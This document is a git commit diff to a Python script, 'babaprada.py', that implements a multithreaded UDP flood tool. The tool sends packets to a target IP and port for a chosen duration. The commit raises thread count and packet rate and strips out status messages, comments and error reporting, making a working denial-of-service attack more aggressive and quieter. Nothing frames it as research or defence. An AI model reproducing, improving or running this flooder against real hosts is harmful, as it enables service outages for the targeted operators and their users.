2380174b997318d28abebf6e2904868b0dad6cc9
batenospatronxd <emreozyurt165@gmail.com>
2025-04-07 21:31:18 +0300

    Update babaprada.py

--- babaprada.py
+++ babaprada.py
@@ -1,7 +1,6 @@
 import socket
 import random
 import time
-import sys
 import threading
 import multiprocessing
 from argparse import ArgumentParser
@@ -10,25 +9,19 @@ class UDPFlooder:
     def __init__(self, target_ip, target_port, duration):
         self.target_ip = target_ip
         self.target_port = target_port
-        # Smaller packet size for more packets
-        self.packet_size = 1024  # Reduced from 65507 to send more packets
+        self.packet_size = 1024
         self.duration = duration
-        self.sent_packets = 0
         self.running = False
-        # Increased thread count for more aggressive attack
-        self.num_threads = multiprocessing.cpu_count() * 4  # Doubled thread count
+        self.num_threads = multiprocessing.cpu_count() * 8
 
     def create_socket(self):
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            # Increased socket buffer size
-            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)  # 1MB buffer
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1048576)
             sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-            # Set socket to non-blocking mode
             sock.setblocking(0)
             return sock
-        except socket.error as e:
-            print("Error creating socket: {}".format(e))
+        except:
             return None
 
     def generate_packet(self):
@@ -41,30 +34,13 @@ class UDPFlooder:
 
         self.running = True
         start_time = time.time()
-        packets_per_second = 0
-        last_time = time.time()
         
         try:
             while self.running and (time.time() - start_time) < self.duration:
                 try:
-                    # Send multiple packets in a loop without sleep
-                    for _ in range(100):  # Send 100 packets per iteration
+                    for _ in range(200):
                         sock.sendto(self.generate_packet(), (self.target_ip, self.target_port))
-                        self.sent_packets += 1
-                        packets_per_second += 1
-                    
-                    # Calculate and display packets per second
-                    current_time = time.time()
-                    if current_time - last_time >= 1.0:
-                        sys.stdout.write("\rPackets sent: {} | PPS: {} | Elapsed: {:.1f}s".format(
-                            self.sent_packets, packets_per_second, current_time - start_time))
-                        sys.stdout.flush()
-                        packets_per_second = 0
-                        last_time = current_time
-                        
-                except socket.error:
-                    # Non-blocking socket will raise error when buffer is full
-                    # Just continue sending
+                except:
                     pass
         finally:
             sock.close()
@@ -72,10 +48,6 @@ class UDPFlooder:
 
     def start(self):
         threads = []
-        print("Starting attack with {} threads".format(self.num_threads))
-        print("Using packet size: {} bytes".format(self.packet_size))
-        print("Press Ctrl+C to stop")
-        
         for _ in range(self.num_threads):
             thread = threading.Thread(target=self.flood)
             thread.daemon = True
@@ -86,31 +58,22 @@ class UDPFlooder:
             while any(t.is_alive() for t in threads):
                 time.sleep(0.1)
         except KeyboardInterrupt:
-            print("\nStopping flood...")
             self.running = False
             for thread in threads:
                 thread.join()
-        finally:
-            print("\nTotal packets sent: {}".format(self.sent_packets))
-            print("Average packets per second: {:.2f}".format(self.sent_packets / self.duration))
 
 def main():
-    parser = ArgumentParser(description="UDP Flooder Tool - Maximum Power Mode")
-    parser.add_argument("target_ip", help="Target IP address")
-    parser.add_argument("target_port", type=int, help="Target port")
-    parser.add_argument("duration", type=int, help="Attack duration in seconds")
-
+    parser = ArgumentParser()
+    parser.add_argument("target_ip")
+    parser.add_argument("target_port", type=int)
+    parser.add_argument("duration", type=int)
     args = parser.parse_args()
 
     try:
         flooder = UDPFlooder(args.target_ip, args.target_port, args.duration)
-        print("Starting UDP flood attack on {}:{}".format(args.target_ip, args.target_port))
-        print("Duration: {} seconds".format(args.duration))
         flooder.start()
-    except KeyboardInterrupt:
-        print("\nAttack stopped by user")
-    except Exception as e:
-        print("Error: {}".format(e))
+    except:
+        pass
 
 if __name__ == "__main__":
     main() 
